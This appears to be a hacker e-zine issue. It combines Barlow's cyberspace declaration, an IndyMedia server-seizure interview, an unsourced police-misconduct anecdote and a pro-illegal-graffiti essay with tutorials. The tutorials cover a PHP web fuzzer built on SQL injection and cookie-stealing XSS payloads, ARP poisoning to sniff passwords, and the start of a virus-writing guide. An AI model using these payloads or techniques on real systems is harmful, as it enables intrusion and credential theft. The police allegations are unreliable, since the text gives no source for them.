You cannot. It is an act of nature and it grows itself through our collective
actions.

You have not engaged in our great and gathering conversation, nor did you create
the wealth of our marketplaces. You do not know our culture, our ethics, or the
unwritten codes that already provide our society more order than could be
obtained by any of your impositions.

You claim there are problems among us that you need to solve. You use this claim
as an excuse to invade our precincts. Many of these problems don't exist. Where
there are real conflicts, where there are wrongs, we will identify them and
address them by our means. We are forming our own Social Contract. This
governance will arise according to the conditions of our world, not yours. Our
world is different.

Cyberspace consists of transactions, relationships, and thought itself, arrayed
like a standing wave in the web of our communications. Ours is a world that is
both everywhere and nowhere, but it is not where bodies live.

We are creating a world that all may enter without privilege or prejudice
accorded by race, economic power, military force, or station of birth.

We are creating a world where anyone, anywhere may express his or her beliefs,
no matter how singular, without fear of being coerced into silence or
conformity.

Your legal concepts of property, expression, identity, movement, and context do
not apply to us. They are based on matter, There is no matter here.

Our identities have no bodies, so, unlike you, we cannot obtain order by
physical coercion. We believe that from ethics, enlightened self-interest, and
the commonweal, our governance will emerge. Our identities may be distributed
across many of your jurisdictions. The only law that all our constituent
cultures would generally recognize is the Golden Rule. We hope we will be able
to build our particular solutions on that basis. But we cannot accept the
solutions you are attempting to impose.

In the United States, you have today created a law, the Telecommunications
Reform Act, which repudiates your own Constitution and insults the dreams of
Jefferson, Washington, Mill, Madison, DeToqueville, and Brandeis. These dreams
must now be born anew in us.

You are terrified of your own children, since they are natives in a world where
you will always be immigrants. Because you fear them, you entrust your
bureaucracies with the parental responsibilities you are too cowardly to
confront yourselves. In our world, all the sentiments and expressions of
humanity, from the debasing to the angelic, are parts of a seamless whole, the
global conversation of bits. We cannot separate the air that chokes from the air
upon which wings beat.

In China, Germany, France, Russia, Singapore, Italy and the United States, you
are trying to ward off the virus of liberty by erecting guard posts at the
frontiers of Cyberspace. These may keep out the contagion for a small time, but
they will not work in a world that will soon be blanketed in bit-bearing media.

Your increasingly obsolete information industries would perpetuate themselves by
proposing laws, in America and elsewhere, that claim to own speech itself
throughout the world. These laws would declare ideas to be another industrial
product, no more noble than pig iron. In our world, whatever the human mind may
create can be reproduced and distributed infinitely at no cost. The global
conveyance of thought no longer requires your factories to accomplish.

These increasingly hostile and colonial measures place us in the same position
as those previous lovers of freedom and self-determination who had to reject the
authorities of distant, uninformed powers. We must declare our virtual selves
immune to your sovereignty, even as we continue to consent to your rule over our
bodies. We will spread ourselves across the Planet so that no one can arrest our
thoughts.

We will create a civilization of the Mind in Cyberspace. May it be more humane
and fair than the world your governments have made before. 

John Perry Barlow, Cognitive Dissident
Co-Founder, Electronic Frontier Foundation
Davos, Switzerland     February 8, 1996

[------------------------------------------------------------------------------]
[ uk indymedia interview: hackers defending open publishing systems .......... ]
[------------------------------------------------------------------------------]

Activists from HackThisSite.org at down with one of the UK IndyMedia system
administrators at the recent DEFCON hacker convention. We interviewed him
regarding the server seizures, how hackers can work to protect open publishing
systems such as IndyMedia, and how hackers are becoming more radicalized and
involved with social justice struggles. This interview is being streamed as part
of the new website http://www.Hacktivist.net. 

Listen to the interview via MP3: http://www.hacktivist.net/radio/ukindymedia.mp3

Jeremy: This is Jeremy from HackThisSite.org and I'm sitting in the room with
several people who are loosely affiliated with our website as well as someone
who is on the UK IndyMedia project. We have a few things we'd like to talk about
like how to protect open publishing systems such as IndyMedia, how to configure
our servers in such a way that makes us less liable, and how hackers can play a
more integral role in defending open publishing systems. Other people are going
to introduce themselves right now:

UK: Hello this is ..... from the UK and I'm from UK IndyMedia

Alx: This is Alxciada from HTS

Gary: This is Gary Naham, an activist in Chicago hoping to becoming a hacktivist
dedicated to seeing government systems that survive and respect the digital
evolution of technology and not interfere

Jeremy: We have a few things we'd like to talk about specifically about how
hackers can play a more integral role and help work with various media
collectives, but we'd also like afterwards talk in general about IndyMedia, free
speech, open publishing systems, p2p file sharing systems, and how hackers can
work together with people to help pressure and change the law. For starters, why
don't you tell us a little bit about yourself, what sort of work you do, what
groups you work with in the past, how you help out?

UK: A little about myself, well, by day an IT techie, by night an IT director I
run public internet, public internet is one of the hosting points indymedia uk,
the wiki server, and I kinda got involved when the server seizure happened about
9-12 months ago, kinda became quite important to me that we brought em up as
quickly as possible because the time we're down, we lose the chance to tell our
side of the story so I put up one of our servers put a mirror off the publishing
site and we went from there.

Jeremy: Great. So right now you're currently working as IT director to help out
with configuring and setting up these servers when they go down?

UK: Yeah that's right, let me quickly go over all the things I'm involved with.
Primarily I run a server mirroring the UK site. Additionally I set up rackspace
for some of the other indymedia projects that are currently going on. Current in
the process of trying to security data with what's going on in the world.

Jeremy: I understand that it is very vague about what the feds had been looking
for on these servers and there's some degree of confusion. Can you tell us any
details about what sort of data or evidence they were looking for and how they
executed the search?

UK: From my understanding it wasn't actually the feds who were after the server.
My understanding is that it was a result of pressure by the Swiss and Italian
government relating to previous protests in Genoa and Niece, I believe those
were the two areas of interests. I believe photos were published which ...
authorities didn't like, and yeah, they were looking for server logs, they were
looking for IPs, now fortunately, our server doesn't log IPs!

[Great! What a shame! Too bad!]

Jeremy: I heard the pictures that were posted were undercover police and they
were looking for the people who originally published them?

UK: That's the Swiss connection I believe, however I think the Italian
government had a more general problem with IndyMedia - I met with the house I
wonder if that's what that connection came from.

Jeremy: How could the Italian authorities pressure the British government to
execute this raid?

UK: As I understand it, there's a mutual legal assistance treaty with Italy and
the US. Now Rackspace which previously hosted the UK server is a US company
which therefore falls under US jurisdiction to a degree. Question not entirely
legal because the servers were hosted in the UK and rackspace has a legal entity
in the UK, therefore, we believe it should have gone through due process in the
UK who should have taken the servers - they didn't, that's what the line is at
the moment.

Jeremy: The hosting company itself gave the server up upon request by western
authorities?

UK: I believe so, now this is one of the interesting things, and this ties back
with where we are today. Apparently, the servers weren't actually requested, the
logs were requested, and Rackspace went one step further. Rackspace effectively
bent over and took it. They handed over the entire server system.

Jeremy: Wow.

Alxciada: So they were originally coming for the logs.

UK: Apparently so, that's what we're hearing, hopefully in the next few days we
should hear a little more about it. The EFF put enough pressure on the US side
to get the papers.

Alxciada: Was it United States federal agents that raided the server?

UK: I believe so. I believe it was Rackspace employees that went in took the
servers. The court orders that were filed were filed in Texas. The EFF basically
went through that and demanded the papers, and that's currently being sorted
out, but hopefully we'll get a clear picture of what they were after.

Gary: Are there any areas of European or British security law that provides
coverage or at least an option of defending against this?

UK: Oh, yes! Data protection acts alone should cover this kind of issue because
they effectively seized a server that hosted shitloads of different stuff. They
were after one very specific piece of information and in the process gathering
lots of other shit so I imagine there are data protection acts that have bearing
on the case.

Gary: Are there legal remedies available to prosecute and affect authorities if
this is an extrajudicial action which is what it sounds like. 

UK: I'm not sure if anything is happening in the UK because unfortunately the UK
Europedoesn't have anything an EFF at this stage. It's one of the things that's
being worked on talked about but it's never achieved fruition. Therefore we're
depending on a far wider group of individuals to help us out. Looking at people
associated with journalism, trade, privacy, etc. but there's no central group
for information privacy having to do with electronic

Gary: So European Data Security laws are even less protective than US security?

UK: I think they are because it was the way the manuveur was pulled. We
effectively never wet through anywhere nearthe UK system. If it went through the
UK system it would be a long drawn out case there would have been pros and cons
we would have had our day in court. But because they went through a backdoor in
the US system - a loophole - it went past our security. 

Gary: That the British were happy to allow?

UK: I don't think the Brits had a whole lot to do with it. From our
understanding Rackspace employees went into the server room yanked the servers.

Jeremy: They were originally were looking for a flat log file and the company
just said ""I'm not gonna mess with this!"" and gave up the entire server?

UK: As I understand it, yes

Jeremy: And there were a lot of other various websites and collectives on the
server?

UK: Oh yes, there was everything from linux distros, to various indymedias,
personal sites - yeah, it hit a lot.

Gary: I would assume this is a violation Rackspace's contract with IndyMedia
entities that have signed it?

UK: Unfortunately the contract was with a single individual. Yes, there probably
was a contract violation there, but as I said, because it never touched UK
authorities, to drag it through the UK system there would be no point of - the
case would fall apart. Because it was in the US the case there was a actual case
in the US going on, there is a lot easier to focus on.

Jeremy: Knowing what you know now about the corporate host and how they were so
quick to give up everything and set back these various collectives, how would
you configure or structure these servers to make the system as a whole less
liable?

UK: Well it's very interesting and actually very simple. We drew a great big
circle around the biggest weakness: we had one server, we now have twelve.

[laughter]

UK: The content management system we use is very good, it's designed for
mirroring. We've basically taken advatage of the way the CMS system was designed
and used it to our advantage. The dynamics are the site are actually done from
the publish server and then the servers actually show the data. 

Jeremy: So when you actually post something to UK IndyMedia it is actually
mirrored to other servers all over the world?

UK: And a variety of different operating systems. Our personal server w3.org is
a Solaris box. Others run debian, freebsd, fedora core - we have a nice
contingent of OSs so if a vulnerability breaks out - unless it's somethig inside
the publishing system itself - we should have a reasonable amount of resiliance.

Jeremy: This seems like a perfect example of how a decentralized model of
content distribution can protect ourselves from not only legal subpoenas because
it creates a aura of bureaucracy the courts have to go through but protect
ourselves from would-be hackers ...

UK: Yes, definitely.

Gary: In an era of extrajudition proceedings where the authorities think they
can do anything they want and just present us with facts despite legal
protections that clearly exist in this case and were violated, I think you have
to use technology to negate the fact that authorities think they are above the
law.

UK: Precisely, it's not the first case and it's not the last. There's things
happening at the moment, servers taken all the time, it's a growing problem,
indymedia needs to be aware of that and try to survive it.

Jeremy: How are people within hacking and programming communities stepped up to
support the project?

UK: In the last 3-4 months we started to put together as security team to go
through each of the servers, each of the code bases, and work for them look for
the weaknesses. I think historically IndyMedia has been pretty lax about that,
more interested with people being able to publish freely and not quite so much
about the security of their systems in which the puiblising occurs, That's
changing, very quickly.

Jeremy: That brings me back to a couple months ago - there had been two major
vulnerabilities - one happened during the RNC with the cross site scripting
error in dadaIMC - a group calling itself RightWingExtremist.net made use of
this during the RNC by changing many indymedia sites to redirect to a site that
said 'indymedia is anti-american' or something crazy! [killing communists!]

UK: The system we're using in the UK is very resiliant, it's java written, the
guy's done a good job we haven't seen too many problems 

Jeremy: Which one are you using?

UK: We're using Mir, it's been pretty responsive.

Jeremy: I believe DadaIMC had had the most problems ..

UK: Yeah, Dada has had a clear history of problems, I agree

Jeremy: A few months ago I had spoken to Spud regarding a vulnerability I
discovered DadaIMC regarding uploading and excecuting PHP files. We privately
notified them of this vulnerability and said, ""listen we need to keep this quiet
until each independent IMC staff is privatley notified and update it. Of course
it's a big job and it's not something that'll happen overnight!

UK: One thing I will say while I've got the opportunity is that there is a
private list for IMC techies. It's a fairly rigorous process to get in there,
but if anyone finds an issue, dump it straight to the people who can deal with
it imc-security@lists.indymedia.org is the place to dump in. The technies in
there have a web of trust where you can't get in unless two other people vouch
for you.

Jeremy: How do you think right-wing hackers and script kiddies have made use of
the open disclosure policy of dadaimc?

UK: I can't really talk much about that unfortunately it's not something I have
been involved with. Certainly people we're working with are going through
dadaimc line by line. 

Jeremy: How can hackers play a more integral role in the development and
protection of this software?

UK: I think the trick is really just to get involved. To get to the point of
where you're a member of the trusted team takes a little bit of work, but
there's nothing to stop people..

Jeremy: Yeah, cause they can still just download the source and just start
auditing.

UK: Yeah, but one thing we don't want happening this has happened once already .
We had a guy portscanned all 13 of the UK mirrors. Now in a sense he found
things we knew about, but on the other hand we don't want to encourage people to
start scanning our boxes because it generates extra processes - we'd be far
happier for people to work with us and communicate with us about what they're
doing this knd of thing- if anything so we don't block them.

Jeremy: I had personally installed it on localhost. How can hackers and civil
rights activists collaborate and work together in order to help pressure the law
and help take the battle to the courts?

UK: I think the biggest thing is to get hackers to understand the issues.
Hackers at the end of the day don't break things. It doesn't take much to see
the political ramifactions of their actions. The only time you really think talk
it as a community is when - the cisco case, something happens, something get
pulled, someone shits in their pants, but nobody takes the interest over a long
term basis. That's frustrating and it needs to change. What the Hack another con
in Europe right now, their talk list is a lot more encompassing, they spend some
time with other issues than security per say, like the DMCA, counter-terrorism,
they think behind the box, and as a hacker community, we all need to do that.

Jeremy: I would certainly agree of your critique, especially of DEFCON, this
seems more like a white hat drunken party, there's not as much teaching here,
only 10% of the people here are maybe hackers anyway, everyone else came here
for the culture, the sideshow. How do you think things have changed over the
past few years in light of some of the new policies and anti-terrorism
legislation? How do you think the hacking community has changed, become more
radicalized?

UK: I think the UK and Europe is certainly starting to pick up this. However,
unlike America where you have a huge great community, Europe doesn't have that,
that's one of the things that is being worked on right now, like the European
constitution, declaration of human rights, that kind of thing. We need to
involved. The people in the ground need to get it done and push it. We've had a
lot of success recently and we need to learn from it.. If European hackers can
bond together, we can stop bad legislation, but we need to pull together. All
too frequently this hasn't happened.

Jeremy: I'm looking at past conventions like Hackers on Planet Earth that
happened last summer. It was held in New York City a month before the Republican
National Convention, so naturally it was a lot more politically charged. I
thought it was a lot more independent, more genuine, talking about hacker rights
and digital rights and how we can protect systems such as IndyMedia - I believe
they actually had an IndyMedia speech and several other political speeches...

UK: What the Hack was the same way. Italian government agents went in and
sniffed the wire effectively and the ISP told IndyMedia it was a power outage.
But yeah, it's bound to happen.

Alxciada: How long ago were your servers actually taken?

UK: Trying to think, I believe it was last June

Jeremy: What do you think about the raid that happened about a month ago in
Bristol?

UK: That's even worse and that's one of those things that are a real issue.
Indymedia needs to move toward encryption circuits and publishing stuff so you
can't tie back to who precisely posted what. The Italian case - my awareness
that is they didn't realize how content is distributed.

Jeremy: What were the circumstances behind the Bristol server being seized? Were
they also looking for server logs?

UK: Yeah, that was a case where a radical collective did some direct action
destroyed some property and police became involved. My understanding is that
someone from IndyMedia tipped off the police. 

Jeremy: So they broke concensus with the larger group, went directly to the
police, and that caused the server as a whole to be seized?

UK: Yeah, and that was hosted in someone's house as well, so they came into
their place.

Alxciada: Did they have any mirrors?

UK: They had another backup but it wasn't actively updated. It is very difficult
to get a hold of someone with the Bristol project. The server was in Texas and
it is difficult to actually switch over the backups. 

Jeremy: The seizure in Bristol happened about a week before the G8
demonstrations?

UK: Yeah, Bristol is fairly seperate collective of the UK, and they hadn't
learned the lessons UK IndyMedia have, which is a shame.

Jeremy: What do you have to say to people who are just beginning to get
involved, just starting to understand these issues. What would be the most
effective way to educating themselves as well as plugging in with various
collectives and people who are involved to take a more active role?

UK: The biggest thing is to just sit down and start reading IndyMedia, working
out how IndyMedia functions, how the global groups decide things effectively.
Then come find us - we are there!

Jeremy: Great! I thought this was very productive. Anything else you'd like to
say?

Gary: I'd like to say one thing. Thank YOU for putting yourself and your
property at risk for the free exchange of digital information because your a
hero and you're putting everything on the line - there's nothing to say that
they won't be busting down your door next. So I admire you for it and more power
to you. It takes a hundred heros like you to keep this movement alive.

UK: There are many of us - in places people wouldn't expect to find us either!

[------------------------------------------------------------------------------]
[ misadventures of irish hackers ........................................... C ]
[------------------------------------------------------------------------------]

At the first ever Northern Ireland Computer Security Enthusiast Convention
(NICSE CON) held in the Europa Hotel Belfast saw the amalgamation of 87 hackers,
14 Computer Science Professors, 19 System Administrators, and 4 Police Officers,
All with the common goal to seek and learn new security Information. 

The Con held many activities such as 
Capture The Flag ( Fedora Systems Used) 
Hack the Hotel ( A successful bid to take over the Hotels Internal IT system) 
The Hammond Files ( An in-depth Discussion into his situation) 
Hackthissite Ð ( Discussion into Origins, successÕs , Failures ) 
Presentations on Bluetooth Hacking
Presentations on the Northern Ireland Hackers ( Growth, Skills ) 

All in all it was a fantastic day, however as most of you DNScon and DEFCON
goers know, the real stuff doesnÕt happen until the con is over and people start
to talk. 

As I was one of the organisers, I was getting a lot of people coming up to me
talking about different things. However one man in particular caught my
attention; he said he was a Police Officer working in the Computer Sides of
things Ð Forensics, Stings etc. So I immediately offered him to come join the
other organisers and myself for the usual post-con pint of Guinness.

As usual the topic of Politics came up, and obviously his views were more than
interesting due to his occupation. Progressively we turned the conversation
around to the IRA (Army sworn to keep Ireland Free from British Soldiers and to
create a united Ireland). The officer started to talk about his involvement in
certain operations against the IRA (Strictly of the Record of Course:-P). 

One of the operations he only heard about was the tapping of the Sinn Fein
Office (Sinn Fein the political Wing of the IRA). When Sinn Fein left their
offices at night, the Special Agents would break into the offices and plant tiny
little bugging devices so they could hear the Sinn Fein Leaders speak. Not only
was this not authorised but also HIGHLY illegal. 

(picture)

This is part of a British MI5/PSNI bugging device found hidden in the
floorboards of a Sinn Fein office in Belfast in September 2004. Approx 10.5
inches by 6.5 inches.
(At this point I may tell you that this officer was totally against all of this
illegal activity from the police, and he knew his consequences of telling us
this information. However reasons not known to us, he told us everything. For
this, we thank you) 

The officer also got us interested by the current case that he was working on at
the time. Operation ÒMirrorÓ Ð This operation called for the officer and a team
of computer Experts within the force to implant Key logging Software onto IRA
suspects as well as Sinn Fein Politicians. This software was implanted by
several methods. By finding computers that the Suspects used and actually
loading the software onto the computer in front of them, or the less than legal
way of inserting this software onto the Suspects and Politicians computer
remotely ( i.e. HACKING). 

The officer told us, that none of this was legal, and none of this was given
permission from the Chief Constable. However the team were told to keep this a
secret. Another interesting point was that the data obtained from the suspects
was used to Black Mail the suspects. They also found Credit Card numbers and ran
illegal checks on their purchases. 

This says a lot about the Northern Ireland Police Service. That they would be as
low as to perform illegal acts in order to Blackmail and incriminate innocent
people. However this isnÕt just an isolated case in Northern Ireland, its all
over the world. 

[------------------------------------------------------------------------------]
[ graffiti and counter-culture ........................ the wooster collective ]
[------------------------------------------------------------------------------]

The graffiti movement is by its very nature a counter-culture,
anti-establishment mindset that is an alternative to the mainstream. It is a
rejection of the status quo.

When you decide that you are going to go up against the establishment, often all
you have is yourself. The only way you can survive is to protect yourself. If
you don't protect yourself, you die. If not literally, then spiritually.
Because you don't have any resources given to you by the mainstream
establishment that you rejected, the only way you can surviive and protect
yourself. The way you do this is to develop your own personal moral code that
allows you to survive in a world that is outside ""the norm"" It is this code that
drives you. Not money. Not a house with a white picket fence. Only your beliefs.
The code is what gives you piece of mind when things get tough. It's what allows
you to go to jail for your actions and then get right back out there to get up
once again.

It's the code that stops you from going crazy.
So where do you develop this code?
You develop it on the streets.
You learn it from watching and talking to others.
But most importantly, you get it from experiencing life.

And that's why graf culture is so powerful to people who do it. You get to
experience life to the fullest. You are truly alive, risking what you have,
rejecting the establishment, but living your life the way you have defined it.
You have real, true freedom.

As you experience life on the street you begin to pick up experiences like they
were little scraps of paper. And you start to make a collage with the
experiences. You put all of the scraps together and it becomes your own personal
fabric that defines who you are.

You are defined by reality, not by television.
You are defined by experience, not by aspiration.
It's your code and nobody elses. And nobody can take it away from you.
And now, suddenly, you have a weapon.
The code itself becomes your weapon.

Your life is on the street. And there's an order to it. You know where things
are meant to be. Things are where they should belong. Ads go on billboards.
Graffiti goes on walls and doors. The two co-exist. They clash, but they know
where they each should be.

If you're living the life of a true graffiti artist, you're livin' by the code
you have created for yourself.

And what this means is...

Graffiti shouldn't be in ads and ads shouldn't be in graffiti.
Graffiti in an ad is an ad. It's not graffiti.
Graffiti done legally is public art sanctioned by the establishment. It's not
graffiti.

For graffiti to be graffiti, it has to be done illegally.

Period.

                                !!!!!!!!!!!!!!!!
                                !!!  SKILLS  !!!
                                !!!!!!!!!!!!!!!!

[ -----------------------------------------------------------------------------]
[ writing a php fuzzer to self-discover web vulnerabilities .................. ]
[ -----------------------------------------------------------------------------]

Fuzzers are tools which can audit code and probe systems for generic
vulnerabilities. For the purpose of this article, we will write several
functions for a PHP script which will fuzz the GET parameters of a URL to
trigger error codes and discover potential vulnerabilities. We will then explore
possibilities of expanding the functionality to become a broader
all-emcompassing web vulnerability auditing tool.

Our web fuzzer works by taking a URL and manipulating each GET variable to make
every possible combination of requests with an array of malicious characters
designed to generate errors. Consider the following array which contains a large
selection of common requests which often generate errors and could open scripts
up to security holes.

// malicious web requests
$vulnchars[0] = array(""%00"",""%2527%252esasdf"",""%u0000"",
""%u5c00%u2700"",""/"",""../"",""./..././"",""/%2e/"", ""%2e"",""%5C"",""%s"", ""'"",""'''''"",""\"""",
""%%%%%%"",""!!!!!!!!!!!!!!!!!!"",""#"", ""%5C27"",""%%5C%56"" , ""\'"", ""\\"",';',"";a"", ""|"",
""\?>"", ""%a0"");
// malicious sql requests
$vulnchars[1] = array("" OR 1=1"", ""' OR '!'='!"");
// malicious xss requests  
$vulnchars[2] = array(""javascript:alert(String.fromCharCode(65,66,67))"",
""<script>alert('cookies, yo: ' + document.cookie);</script>"");

We would then make all possible combinations of web requests and analyze the
output. Scan the results for an array of common error code output and generate a
list of 'flagged' URLs to be later reviewed for auditing purposes. We have put
together the following array which contains a list of common web, sql, and xss
errors.

$flags[0] = array(""<b>warning</b>:"", ""warning:"", ""<b>fatal error</b>"", ""failed
to open stream:"", ""internal server error"", ""there was an error when processing
this directive."", ""http/1.1 400"", ""http/1.1 403"", ""http/1.1 500"", ""gateway
error"", ""command not found"", ""file not found"");
$flags[1] = array(""[obdc"", ""mysql error"", ""you have an error in your sql
syntax"", ""odbc drivers error"", ""[microsoft sql"", );
$flags[2] = array(""javascript:alert(string.fromcharcode(65,66,67))"",
""<script>alert('cookies, yo: ' + document.cookie);</script>"");

Now that we know what kind of requests to make and what we should be parsing the
output for, we can write some PHP code which will query the HTTP server for our
requests. In this example, we are only making GET requests, but it can be easily
modified ti include other HTTP methods.

function MakeRequest($url, $method=""GET"") {
  $url = str_replace("" "", ""%20"", $url);
  if ($method==""GET"") {
    $host = substr($url, strpos($url, ""://"") + 3);$host=substr($host,
0,strpos($host, ""/""));
  $request = substr($url, strpos($host, ""/""));

  $fp = @fsockopen($host, 80, $errno, $errstr, 10);
  if (!$fp) {
     echo ""    ERROR . $url $errstr ($errno)$newline"";
  } else {
     $out  = ""GET $request HTTP/1.1\r\n"";
     $out .= ""Host: $host\r\n"";
     $out .= ""Connection: Close\r\n\r\n"";
     fwrite($fp, $out);
     while (!feof($fp)) {
         $buf.= fgets($fp);
     }
     fclose($fp);
    }
  } 
  return $buf;
}

Now that we can get results from the HTTP server for our malicious requests, we
need to run it through a function to scan it for the error codes listed above.
The following function returns true if the $result has any matches from the
$flags array.

function TestResult ($result) {
  global $flags;
  $result = strtolower($result);
  for ($i=0;$i < count($flags);$i++) {
    for ($o=0;$o < count($flags);$o++) {
      if (!(strpos($result, $flags[$i][$o]) === false)) {
        return 1;
      }
    }
  }
  return 0;
}

Having all the pieces we need, it's time to write some code to tie everything
together. The following code uses the array $lists to contain all URLs to probe.
It first parses the URL for all GET parameters to fuzz and starts a loop to test
all possible combinations of unique URLs. It goes through each GET variable and
tries each malicious character while using the default value of all other GET
parameters. The total number of requests should be around N ^ N for each url in
$list where N is the number of GET parameters in each URL). It then MakesRequest
for each unique URL and passes the results off to TestResult, announcing if a
match against one of the error codes from $flag.

    for ($inc=0;$inc<count($list);$inc++) {
	  if ($localonly == true AND (substr($list[$inc], 0, 17) !=
""http://localhost/"" AND substr($list[$inc], 0, 17) != ""http://127.0.0.1/""))
die(""Sorry, this script can only be tested against localhost."");
	  
	  // SetUpParameters parses and stores each GET paramater from a URL into
the array $get and $getvalues
	  $url = SetUpParameters($list[$inc]);
	  if (trim($url) != """") { 
	  echo ""$newline$url$newline"";
      // go through each kind of vulnerability we are testing
	  for ($vulni=0;$vulni<count($vulnchars);$vulni++) {
		switch ($vulni) {
		  case 0: echo ""  * General web vulnerabilities$newline""; break;
		  case 1: echo ""  * SQL vulnerabilities$newline""; break;
		  case 2: echo ""  * XSS vulnerabilities$newline""; break;
		}
		// go through each GET parameter in the URL
		for ($o=0;$o < count($get);$o++) {
		  for ($i=0;$i<count($vulnchars[$vulni]);$i++) {
			// generate url from list of vulnerable characters
			$whichparam = $get[$o];
			$testing = $url . ""?"";
			// put together the default values for all the other parameters in
the script
			for ($z=0;$z<count($get);$z++) {
			  if ($get[$z] != $whichparam)
$testing.=""&"".$get[$z].""="".$getvalue[$z];
			}
			$testing .= ""&"" . $whichparam . ""="" . $vulnchars[$vulni][$i];
		  
			$fun = MakeRequest($testing);
			if ($parseforlinks == true) ParseForLinks($fun);
			$error = TestResult($fun);
			if ($error != 0) 
			  echo ""    FLAG! .. $testing$newline"";
	  		if ($error == 0 and $verbose == true)
		  	  echo ""    OK    .. $testing $newline"";
		    }
		  }
	    }
	  }
	}
	
This code is the bare essentials to writing a web GET request fuzzer. There are
loads of features which can expand this script to be a more encompassing web
auditing tool. For starters, the script can be written to read the output of a
URL and spider it for additional URLs in <a href=""http://$host/""> tags to be
added to the $list array. It can also be expanded to include other methods
including POST, SSL, cookies, and file upload vulnerabilities. Writing a web
fuzzer is a rewarding programming exercise where the possibilities are endless.


[----------------------------------------------------------------------------- ]
[ arp poisoning ................................................. by darkangel ]
[----------------------------------------------------------------------------- ]

Introduction
This article is meant to teach how ARP works and how one can go about poisoning
the ARP cache and enable them to completely sniff traffic over a switched
network. This article assumes that you already have access to a switched
network. ARP Poisoning is a way of tricking computers over a switched network to
send traffic through you before going to other computers or out to the internet.

Address Resolution Protocol(ARP)
ARP is a dynamic protocol to map a 32bit IP Address to a 48bit physical hardware
address (MAC Address). If one system over a network wants to communicate with
another system over a network, it will first check if it already knows that
systems MAC Address and if not it will send out an ARP broadcast which will look
for the hardware address of the destination system. There are four types of ARP
messages but the main two are ARP Request and ARP Reply. When a system starts
broadcasting an ARP Message it sends out an ARP Request. An ARP Request is a
message sent to the broadcast address, the message contains the sender's IP
Address and MAC Address and requests the MAC Address of the given IP, and then
it waits for an ARP Reply. An ARP Reply replies to the ARP Request and tells the
computer sending the ARP Request what its MAC Address is. 

The ARP Cache is a temporary storage place that holds a table with MAC Address's
and IP Address's. If a computer wants to talk to another computer and it doesn't
already have its MAC address stored it will send an ARP Request. If the Computer
that is sending the ARP Reply does not have the requesting computers MAC Address
it as well will save it to cache. So now both computers have the MAC Address. A
system cannot communicate with another until it has its MAC Address.

ARP is a stateless protocol with no authentication built in so any ARP Reply,
whether there was a request or not will update the ARP Cache on a computer. All
systems will accept an ARP Reply regardless if there was an ARP Request sent.

The Switch
Media Access Control (MAC) is a standard addressing system for all Ethernet
devices. Most networks use switching devices and in a switched network packets
are only sent to the port they are destined to according to their destination
MAC Address. Switches maintain a table that associates MAC Address's with
certain ports. A switch constructs a route table by extracting the source MAC
Address from the Ethernet frame of each packet processed. If any entry in the
route table does not exist the switch will forward the packet out all of its
ports. 

Within a switched network packets are only sent to the destination device making
it, so other devices cannot see the traffic.

Poisoning
There are a few tricks to manipulating a network to send traffic through you
before sending it to the packets to the destination device. One of these methods
is referred to as ARP Poisoning and it is when you send a customized ARP Reply
to different computers across the network tricking their computers into updating
their ARP cache with new MAC Address's (Your MAC Address). So now each time
computer1 wants to send a message to computer2 it gets the MAC address of
computer2's IP and sends the message to that MAC address. But if that MAC
address is changed to your MAC address, by poisoning the ARP Cache the message
will be sent to you instead. After packets are sent to you, you must forward the
packets to the computer it was meant to go in the first place or DoS will be
caused and the hosts will not be able to communicate anymore. Another factor
that you must weigh in are timeouts, if there is no traffic over the network,
after a timeout period the ARP cache of the computers across a network will be
flushed out and you will need to send another constructed ARP reply to the hosts
so that traffic is once again forwarded to you.  One way to fix this is to
automatically send ARP Replies every 10 seconds or so to the hosts that you want
to poison.

Sniffing
Sniffing is the act of capturing packets that aren't necessarily meant for
public viewings. When you sniff packets across a network you can come across
many interesting things such as emails, instant messages, and even passwords to
email accounts and ftp accounts and many other types of passwords which in my
experience are more often than not, left unencrypted. There are many tools out
there that will automatically scan packets for username and password info. You
can also see what websites the person is going to.

Wireless
If an access point is connected directly to a hub or a switch than it leaves the
entire wireless network open to ARP Poisoning. Wireless internet is becoming
more and more used and it is hard to be anywhere that does not have a wireless
access point, especially in well populated areas. This leaves a huge security
risk to most networks because in theory someone with a laptop could go into the
lobby of a business and get on their network by cracking their WEP key or just
simply connecting if they don't even have WEP. The attacker would then just need
to poison the ARP Cache of the different computers across the network and then
forward all traffic through you. You would get their passwords and usernames,
the websites they go to and anything else that you feel would be fun to look at. 

Tools
Ettercap http://www.ettercap.sourceforge.net 
Allows you to sniff networks and poison the arp and auto redirect traffic
TCP Dump http://www.tcpdump.org/ 
A general purpose packet sniffer
Cain&Able http://www.oxid.it/cain.html 
Allows you to sniff networks and poison the arp and redirect traffic. Does not
work over wireless and is only for windows. But is very usefull for cracking
passwords that you come across
ARPoison http://arpoison.sourceforge.net/ 
Command line tool for UNIX which sends out spoofed packets
Nemesis http://nemesis.sourceforge.net/
A very good packet injection tool
Dsniff, Arp Redirect http://naughty.monkey.org/~dugsong/dsniff/ 
Will let you intercept packets and get passwords and redirect the traffic, very
good tool

[------------------------------------------------------------------------------]
[ ars viralis : the viral art .................................. by nomenumbra ]
[------------------------------------------------------------------------------]

0) Introduction 
       0->1) What is a virus?
       0->2) Types of malware?

1) Abstract concepts
       1->1) Survival Concept
       1->2) Survival Theory

2) Code Practice
      2->1)  Simple Exe Virii
      2->2)  Batch Virii
      2->3)  Script Virii
      2->4)  Moderate ExeVirii/Worms
      2->5)  Concept Virii

Foreword.

""And God blessed them, saying, Be fruitful, and multiply, and fill the waters in
the seas, and let fowl multiply in the earth.""

From the beginning of mankind's existence, they were fascinated with creating
life, another creature, with a ""mind"" of it's own, a creature that can turn
itself against it's master. I think this is one of the main reasons why the VX
scene exists. Most viruswriters (including me) enjoy the challange of creating a
small life form that ""lives"" on it's own.

0) Introduction
Well, enough preaching for today. Before I start with technical explainations, I
will first make a few things clear to the really,really new people out there.

0->1) What is a virus?
Well, a better question would be, what is malware? As this umbrellaterm covers
much more than just virii. Malware is the common term for any unwanted program
on your box. It can be divided in several catogories:

I) Virii.
Most people think virii and malware are the same, but that is a common
misassumption. A virus is (in my opinion) best defined as: ""A self-replicating
program that abuses other (host) programs in order to spread"". A virus always
needs a host program, it cannot spread on it's own, it needs other programs to
infect.

II) Worms.

The main difference between a worm and a virus are the way of replication, a
worm can live without a host, it's like a bacteria, it copies itself and
propagates itself trough many different ways. Unlike a virus, most worms won't
infect other programs.

III) Trojans.

These sneaky little devils derive their name from the ancient greek myth of the
wooden horse of Troje (you know, with Odysseus inventing a trick to get into the
city and coming up with this huge wooden horse which contains the greek
soldiers). Well, today's trojan horses are much like that, they pose like an
innocent or (more often) a very attractive file, but they actually contain a
